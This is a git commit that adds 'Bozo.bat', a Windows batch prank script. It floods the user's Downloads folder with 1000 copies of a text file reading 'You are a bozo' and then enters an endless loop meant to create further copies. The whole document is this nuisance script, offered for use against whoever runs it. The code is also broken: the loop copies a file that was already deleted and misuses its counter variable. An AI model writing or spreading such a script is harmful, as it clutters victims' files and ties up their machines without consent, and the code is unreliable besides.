8c1dd8c2da5872292028aec3a2cff02cb59b3392
Babyporkchop <93239527+Babyporkchop@users.noreply.github.com>
2022-08-08 22:19:40 +0800

    Create Bozo.bat

---
+++ Bozo/Infinite/Bozo.bat
@@ -0,0 +1,15 @@
+@echo off
+set /A y = 1
+cd %homepath%
+cd downloads
+echo You are a bozo > Bozo.txt
+for /l %%x in (1, 1, 1000) do (
+copy Bozo.txt Bozo%%x.txt
+)
+del Bozo.txt
+:start
+for /l %%x in (1, 1, 1000) do (
+copy Bozo.txt Bozo%%y%%x.txt
+)
+set /A y = %%y + 1
+goto :Start
